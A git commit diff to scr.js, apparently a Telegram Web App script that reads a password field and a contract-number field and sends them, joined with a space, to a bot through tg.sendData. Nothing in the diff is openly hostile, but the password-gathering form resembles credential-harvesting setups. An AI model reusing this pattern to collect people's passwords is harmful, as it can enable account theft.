bc038ec8dd0f300d7225696164b78e31ddca9dbf
zalup4k228 <147541094+zalup4k228@users.noreply.github.com>
2023-10-22 04:47:20 +0300

    Update scr.js

--- scr.js
+++ scr.js
@@ -4,9 +4,10 @@ tg.expand();
 
 btn.addEventListener("click", function(){
     var pass = document.getElementById("pass").value; // Получаем актуальное значение поля пароля
-    var ang = document.getElementById("ang").value; // Получаем актуальное значение поля номера договора
+    var ang = document.getElementById("ang").value; // Получаем актуальное значение поля номера договора 
+    var combinedData = pass + ' ' + ang;
     
     tg.MainButton.setText("Сообщение отправлено!");
     tg.MainButton.show();
-   tg.sendData(pass, ang);
+   tg.sendData(combinedData);
 });
